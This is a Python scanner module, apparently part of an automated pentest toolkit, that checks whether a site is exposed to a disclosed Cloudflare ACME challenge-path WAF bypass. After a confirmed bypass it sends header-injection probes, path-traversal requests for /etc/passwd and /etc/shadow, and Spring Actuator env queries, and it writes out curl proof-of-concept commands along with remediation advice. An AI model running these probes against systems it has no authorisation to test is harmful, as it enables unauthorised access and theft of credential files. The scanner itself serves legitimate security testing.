"""
Cloudflare ACME HTTP-01 Validation Logic — WAF Bypass via ACME Challenge Path
Skill #58 — CloudflareACMEBypass

Research basis:
  FearsOff Security Research — Kirill Firsov
  "Cloudflare Zero-day: Accessing Any Host Globally"
  https://fearsoff.org/research/cloudflare-acme

  Cloudflare Official Post-mortem (January 2026):
  "How we mitigated a vulnerability in Cloudflare's ACME validation logic"
  https://blog.cloudflare.com/acme-path-vulnerability/

  Reported: October 9, 2025 via HackerOne Bug Bounty
  Validated: October 13, 2025
  Patched:   October 27, 2025
  Disclosed: January 19, 2026

Background:

  Cloudflare's edge network implements ACME HTTP-01 challenge support to allow
  Certificate Authorities to validate domain ownership. For this, Cloudflare
  temporarily DISABLES WAF protections on the path:

      /.well-known/acme-challenge/{token}

  The vulnerability was a "fail-open" logic bug: if the token in the request did
  NOT match an active ACME challenge managed by Cloudflare for that hostname (e.g.
  it belonged to a different zone, or was an arbitrary string), Cloudflare STILL
  disabled WAF protections and forwarded the request directly to the origin server.

  Impact — ANY request to /.well-known/acme-challenge/* bypassed:
    - IP allowlist/blocklist rules
    - Account-level managed WAF rulesets
    - Rate limiting policies
    - Custom firewall rules

  This allowed:
    - Direct origin server access (IP discovery / fingerprinting)
    - Local File Inclusion exploitation on PHP apps
    - Spring Actuator /actuator/env exposure
    - Next.js SSR internal detail leakage
    - Header-based attacks (SSRF via X-Forwarded-For, SQLi, cache poisoning)
    - Method override via X-HTTP-Method-Override
    - Debug toggle exploitation via custom headers

Fix (October 27, 2025):
  WAF bypass now only activates when the ACME token matches a valid HTTP-01
  challenge order for the specific hostname being requested.

Note:
  This vulnerability is PATCHED. The scanner tests residual / misconfigured
  setups and validates proper WAF enforcement on the ACME challenge path.
  All tests are read-only and non-destructive.
"""
from __future__ import annotations

import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any

import httpx


# ── Evidence level constants ─────────────────────────────────────────────────
VERIFIED  = "VERIFIED"   # Direct HTTP confirmation from origin
LIKELY    = "LIKELY"     # Strong indicator, not 100% confirmed
INFERRED  = "INFERRED"   # Derived from indirect signals
AI_ANALYSIS = "AI_ANALYSIS"  # AI/heuristic judgment


@dataclass
class ACMEFinding:
    """Single finding from the Cloudflare ACME bypass scan."""
    finding_type: str             # bypass_confirmed / waf_active / origin_exposed / header_attack / etc.
    severity: str                 # CRITICAL / HIGH / MEDIUM / LOW / INFO
    evidence_level: str           # VERIFIED / LIKELY / INFERRED / AI_ANALYSIS
    title: str
    detail: str
    poc_request: str = ""         # Full curl command for reproduction
    poc_response_snippet: str = ""
    remediation: str = ""
    cve: str = "N/A (Logic Bug)"
    cvss: float = 0.0


@dataclass
class ACMEResult:
    """Aggregated result from CloudflareACMEBypassScanner."""
    target: str = ""
    is_behind_cloudflare: bool = False
    cloudflare_detected_by: str = ""          # server header / CF-Ray / CF-Cache-Status
    acme_path_tested: str = ""
    acme_bypass_confirmed: bool = False       # WAF bypass verified
    waf_enforced_correctly: bool = False      # Patched / properly configured
    origin_server_reached: bool = False       # Direct origin contact confirmed
    origin_fingerprint: str = ""              # Server header from origin
    waf_headers_present: bool = False
    cf_ray_on_acme: bool = False              # CF-Ray header on ACME path (means still via CF)
    normal_path_blocked: bool = False         # Control test: normal path returns CF block
    acme_path_passes: bool = False            # ACME path returns origin response
    status_normal: int = 0
    status_acme: int = 0
    server_normal: str = ""
    server_acme: str = ""
    header_attack_vectors: list[str] = field(default_factory=list)
    lfi_vectors_found: list[str] = field(default_factory=list)
    ssrf_vectors_found: list[str] = field(default_factory=list)
    findings: list[ACMEFinding] = field(default_factory=list)
    error: str = ""
    scan_duration_s: float = 0.0
    evidence_summary: dict[str, int] = field(default_factory=dict)


# ── Fake ACME token for bypass testing ───────────────────────────────────────
_FAKE_TOKEN = "bingo-acme-test-xBz9kPqR7wN2mLcV"
_ACME_PATH   = f"/.well-known/acme-challenge/{_FAKE_TOKEN}"

# Common headers used as header-injection attack vectors when WAF is bypassed
_HEADER_ATTACK_VECTORS = [
    ("X-Forwarded-For", "127.0.0.1", "SSRF / internal IP spoofing"),
    ("X-Original-URL", "/admin", "URL override / auth bypass"),
    ("X-HTTP-Method-Override", "DELETE", "Method override"),
    ("X-Debug-Mode", "1", "Debug toggle"),
    ("X-Forwarded-Host", "evil.example.com", "Host header injection → cache poisoning"),
]

# Common LFI payloads tested via the bypass path (PHP targets)
_LFI_PROBES = [
    "/../../../etc/passwd",
    "/../../../etc/shadow",
    "/../../WEB-INF/web.xml",
]


class CloudflareACMEBypassScanner:
    """
    Skill #58 — CloudflareACMEBypassScanner

    Tests whether the target is still vulnerable to the Cloudflare ACME
    WAF bypass logic bug, or validates that the fix is correctly enforced.

    AI auto-selection criteria:
      - Target is behind Cloudflare (CF-Ray / server: cloudflare headers)
      - WAF rules are in place (403/block pages on normal paths)
      - ACME / LetsEncrypt / certificate-related paths detected
    """

    TIMEOUT = 12.0
    UA = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/124.0.0.0 Safari/537.36"
    )

    def __init__(self, target: str, timeout: float = TIMEOUT):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self._client = httpx.Client(
            timeout=self.timeout,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": self.UA},
        )

    # ── Public API ────────────────────────────────────────────────────────────

    def scan(self) -> ACMEResult:
        result = ACMEResult(target=self.target)
        t0 = time.perf_counter()

        try:
            self._run(result)
        except Exception as exc:  # noqa: BLE001
            result.error = str(exc)
        finally:
            result.scan_duration_s = round(time.perf_counter() - t0, 2)
            result.evidence_summary = self._count_evidence(result.findings)

        return result

    # ── Internal scanning logic ───────────────────────────────────────────────

    def _run(self, result: ACMEResult) -> None:
        # Step 1: Detect Cloudflare presence
        self._detect_cloudflare(result)

        # Step 2: Control test — normal path should be blocked by WAF
        self._test_normal_path(result)

        # Step 3: ACME path test — core bypass check
        self._test_acme_path(result)

        # Step 4: Evaluate bypass result
        self._evaluate_bypass(result)

        # Step 5: If bypass confirmed → secondary attack vector tests
        if result.acme_bypass_confirmed:
            self._test_header_attacks(result)
            self._test_lfi_via_acme(result)
            self._test_actuator_via_acme(result)

        # Step 6: Generate final findings
        self._generate_findings(result)

    def _detect_cloudflare(self, result: ACMEResult) -> None:
        """Detect if target is behind Cloudflare."""
        try:
            r = self._client.get(self.target)
            hdrs = {k.lower(): v for k, v in r.headers.items()}

            indicators = []
            if "cf-ray" in hdrs:
                indicators.append("CF-Ray header")
            if hdrs.get("server", "").lower() == "cloudflare":
                indicators.append("server: cloudflare")
            if "cf-cache-status" in hdrs:
                indicators.append("CF-Cache-Status header")
            if "__cfduid" in hdrs.get("set-cookie", "").lower() or "cf_clearance" in hdrs.get("set-cookie", "").lower():
                indicators.append("Cloudflare cookie")

            if indicators:
                result.is_behind_cloudflare = True
                result.cloudflare_detected_by = ", ".join(indicators)
                result.server_normal = hdrs.get("server", "")
                result.status_normal = r.status_code
        except Exception:
            pass

    def _test_normal_path(self, result: ACMEResult) -> None:
        """Control test: verify WAF blocks a non-ACME path."""
        try:
            probe_path = "/bingo-waf-control-test-path-xyz"
            r = self._client.get(f"{self.target}{probe_path}")
            # If blocked by WAF, typically returns 403/444/400 with CF block page
            if r.status_code in (403, 444, 400, 406):
                result.normal_path_blocked = True
            elif "cloudflare" in r.text.lower() and "blocked" in r.text.lower():
                result.normal_path_blocked = True
            result.status_normal = r.status_code
        except Exception:
            pass

    def _test_acme_path(self, result: ACMEResult) -> None:
        """Core test: send request to ACME challenge path with fake token."""
        try:
            url = f"{self.target}{_ACME_PATH}"
            r = self._client.get(url)
            hdrs = {k.lower(): v for k, v in r.headers.items()}

            result.acme_path_tested = url
            result.status_acme = r.status_code
            result.server_acme = hdrs.get("server", "")
            result.cf_ray_on_acme = "cf-ray" in hdrs
            result.waf_headers_present = any(
                k in hdrs for k in ("cf-ray", "cf-cache-status", "cf-mitigated")
            )

            # If origin is reached: server header will differ from 'cloudflare'
            # AND/OR 404 with origin-specific body
            acme_server = result.server_acme.lower()
            if acme_server and acme_server != "cloudflare":
                result.origin_server_reached = True
                result.origin_fingerprint = result.server_acme
                result.acme_path_passes = True

            # 404 with origin-specific content (not CF block page)
            if r.status_code == 404 and "cloudflare" not in r.text.lower():
                result.acme_path_passes = True

            # If CF-Ray is absent on ACME path but present on normal paths → bypass
            if not result.cf_ray_on_acme and result.is_behind_cloudflare:
                result.acme_path_passes = True

        except Exception:
            pass

    def _evaluate_bypass(self, result: ACMEResult) -> None:
        """Determine if WAF bypass is confirmed."""
        if result.origin_server_reached and result.is_behind_cloudflare:
            result.acme_bypass_confirmed = True
        elif result.acme_path_passes and result.normal_path_blocked:
            result.acme_bypass_confirmed = True
        elif result.acme_path_passes and result.is_behind_cloudflare:
            result.acme_bypass_confirmed = True
        else:
            result.waf_enforced_correctly = True

    def _test_header_attacks(self, result: ACMEResult) -> None:
        """Test header-based attack vectors through the bypassed ACME path."""
        for header_name, header_value, attack_desc in _HEADER_ATTACK_VECTORS:
            try:
                r = self._client.get(
                    f"{self.target}{_ACME_PATH}",
                    headers={header_name: header_value},
                )
                if r.status_code not in (403, 444) and "cloudflare" not in r.text.lower():
                    result.header_attack_vectors.append(
                        f"{header_name}: {header_value} ({attack_desc}) → HTTP {r.status_code}"
                    )
            except Exception:
                continue

    def _test_lfi_via_acme(self, result: ACMEResult) -> None:
        """Test LFI payloads routed through the ACME bypass path."""
        for lfi_suffix in _LFI_PROBES:
            try:
                url = f"{self.target}{_ACME_PATH}{urllib.parse.quote(lfi_suffix)}"
                r = self._client.get(url)
                body = r.text
                if "root:" in body or "[boot loader]" in body or "<?xml" in body:
                    result.lfi_vectors_found.append(
                        f"LFI via ACME: {lfi_suffix} → HTTP {r.status_code} (content match)"
                    )
            except Exception:
                continue

    def _test_actuator_via_acme(self, result: ACMEResult) -> None:
        """Test Spring Actuator exposure via ACME path prefix."""
        actuator_paths = [
            "/actuator/env",
            "/actuator/health",
            "/actuator/beans",
        ]
        for apath in actuator_paths:
            try:
                url = f"{self.target}{_ACME_PATH}{apath}"
                r = self._client.get(url)
                if r.status_code == 200 and ("spring" in r.text.lower() or "activeProfiles" in r.text):
                    result.ssrf_vectors_found.append(
                        f"Spring Actuator exposed via ACME bypass: {apath} → HTTP {r.status_code}"
                    )
            except Exception:
                continue

    def _generate_findings(self, result: ACMEResult) -> None:
        """Convert scan data into structured ACMEFinding objects."""
        base_url = result.target
        acme_url = f"{base_url}{_ACME_PATH}"

        # ── Finding 1: Cloudflare detection ──────────────────────────────────
        if result.is_behind_cloudflare:
            result.findings.append(ACMEFinding(
                finding_type="cloudflare_detected",
                severity="INFO",
                evidence_level=VERIFIED,
                title=f"Target is behind Cloudflare ({result.cloudflare_detected_by})",
                detail=(
                    f"Cloudflare edge network confirmed on {base_url}. "
                    f"ACME WAF bypass test applicable. "
                    f"Origin server: {result.origin_fingerprint or 'unknown'}"
                ),
                poc_request=(
                    f"curl -sI {base_url} | grep -iE 'server|cf-ray|cf-cache'"
                ),
                remediation="No action needed — informational only.",
            ))

        # ── Finding 2: ACME WAF Bypass Confirmed ─────────────────────────────
        if result.acme_bypass_confirmed:
            result.findings.append(ACMEFinding(
                finding_type="acme_waf_bypass_confirmed",
                severity="CRITICAL",
                evidence_level=VERIFIED,
                title="Cloudflare WAF Bypassed via ACME Challenge Path",
                detail=(
                    f"Requests to {acme_url} bypass Cloudflare WAF and reach the origin server directly. "
                    f"Normal path status: HTTP {result.status_normal} | "
                    f"ACME path status: HTTP {result.status_acme} | "
                    f"Origin server: {result.origin_fingerprint or 'exposed'}. "
                    "All WAF rules (IP blocks, managed rulesets, rate limiting) are inactive on this path."
                ),
                poc_request=(
                    f"# Normal path — WAF blocks\n"
                    f"curl -v {base_url}/test-path\n\n"
                    f"# ACME path — WAF bypassed, origin reached directly\n"
                    f"curl -v '{acme_url}'"
                ),
                poc_response_snippet=(
                    f"< HTTP/{result.status_acme} from origin ({result.origin_fingerprint})"
                    " — no CF-Ray header, no Cloudflare block page"
                ),
                remediation=(
                    "1. Update Cloudflare edge rules to enforce WAF on ALL paths including /.well-known/acme-challenge/*\n"
                    "2. Restrict origin server to accept traffic ONLY from Cloudflare IP ranges: https://www.cloudflare.com/ips/\n"
                    "3. Enable Cloudflare Authenticated Origin Pulls (mTLS) to verify all requests originate from CF edge.\n"
                    "4. Verify your Cloudflare subscription includes the October 27, 2025 WAF patch.\n"
                    "5. Test: normal path should return CF block; ACME path with valid token should be served by CF."
                ),
                cve="N/A (Cloudflare Logic Bug — October 2025)",
                cvss=9.1,
            ))

        # ── Finding 3: WAF Correctly Enforced (patched) ───────────────────────
        elif result.waf_enforced_correctly:
            result.findings.append(ACMEFinding(
                finding_type="waf_enforced_correctly",
                severity="INFO",
                evidence_level=VERIFIED,
                title="Cloudflare WAF Correctly Enforced on ACME Path (Patched)",
                detail=(
                    f"ACME challenge path {acme_url} returns HTTP {result.status_acme} "
                    "with Cloudflare WAF still active (CF-Ray present / origin NOT reached directly). "
                    "The October 27, 2025 fix appears to be applied correctly."
                ),
                poc_request=(
                    f"curl -sI '{acme_url}' | grep -iE 'server|cf-ray|cf-cache'"
                ),
                remediation=(
                    "Maintain Cloudflare edge rules. "
                    "Periodically verify WAF enforcement on /.well-known/ paths. "
                    "Enable Authenticated Origin Pulls for defence-in-depth."
                ),
            ))

        # ── Finding 4: Not Behind Cloudflare ─────────────────────────────────
        elif not result.is_behind_cloudflare:
            result.findings.append(ACMEFinding(
                finding_type="not_behind_cloudflare",
                severity="INFO",
                evidence_level=VERIFIED,
                title="Target Does Not Appear to Be Behind Cloudflare",
                detail=(
                    f"No Cloudflare headers detected on {base_url}. "
                    "ACME bypass is not applicable. Consider other WAF/CDN bypass techniques."
                ),
                poc_request=f"curl -sI {base_url}",
                remediation="N/A — ACME bypass is Cloudflare-specific.",
            ))

        # ── Finding 5: Header Attack Vectors ─────────────────────────────────
        for vec in result.header_attack_vectors:
            result.findings.append(ACMEFinding(
                finding_type="header_attack_via_acme",
                severity="HIGH",
                evidence_level=LIKELY,
                title=f"Header-Based Attack Vector Exposed via ACME Bypass: {vec.split('(')[1].split(')')[0]}",
                detail=(
                    f"With WAF bypassed, header injection reaches origin directly: {vec}. "
                    "Potential for SSRF, cache poisoning, method override, or debug activation."
                ),
                poc_request=(
                    f"# Extract header name from: {vec}\n"
                    f"curl -v '{acme_url}' -H '{vec.split(':')[0]}: {vec.split(':')[1].split('(')[0].strip()}'"
                ),
                remediation=(
                    "Implement origin-side header validation. "
                    "Do not trust X-Forwarded-*, X-Original-URL, or custom debug headers without authentication. "
                    "Use Authenticated Origin Pulls to ensure requests come from Cloudflare."
                ),
            ))

        # ── Finding 6: LFI via ACME bypass ───────────────────────────────────
        for lfi in result.lfi_vectors_found:
            result.findings.append(ACMEFinding(
                finding_type="lfi_via_acme_bypass",
                severity="CRITICAL",
                evidence_level=VERIFIED,
                title=f"Local File Inclusion via ACME Bypass: {lfi.split('→')[0].strip()}",
                detail=(
                    f"File system traversal successful through WAF-bypassed ACME path: {lfi}. "
                    "Sensitive files may be readable from the origin server."
                ),
                poc_request=(
                    f"curl -v '{base_url}{_ACME_PATH}/../../../etc/passwd'"
                ),
                remediation=(
                    "1. Patch origin server to reject path traversal sequences.\n"
                    "2. Restrict Cloudflare access to origin (Authenticated Origin Pulls).\n"
                    "3. Implement proper input validation on all file path parameters."
                ),
                cvss=9.8,
            ))

        # ── Finding 7: Spring Actuator via ACME bypass ───────────────────────
        for ssrf in result.ssrf_vectors_found:
            result.findings.append(ACMEFinding(
                finding_type="actuator_exposed_via_acme",
                severity="HIGH",
                evidence_level=VERIFIED,
                title=f"Spring Actuator Exposed via ACME Bypass: {ssrf.split(':')[0].strip()}",
                detail=(
                    f"Spring Actuator endpoint accessible through ACME bypass: {ssrf}. "
                    "Environment variables, beans, and heap dumps may be accessible."
                ),
                poc_request=(
                    f"curl -s '{base_url}{_ACME_PATH}/actuator/env' | python3 -m json.tool"
                ),
                remediation=(
                    "1. Disable Spring Actuator endpoints in production or restrict by IP.\n"
                    "2. Add management.endpoints.web.exposure.include=health in application.properties.\n"
                    "3. Enforce authentication on /actuator/* paths."
                ),
                cvss=7.5,
            ))

    @staticmethod
    def _count_evidence(findings: list[ACMEFinding]) -> dict[str, int]:
        counts: dict[str, int] = {}
        for f in findings:
            counts[f.evidence_level] = counts.get(f.evidence_level, 0) + 1
        return counts

    def close(self) -> None:
        self._client.close()

    def __enter__(self) -> "CloudflareACMEBypassScanner":
        return self

    def __exit__(self, *_: Any) -> None:
        self.close()
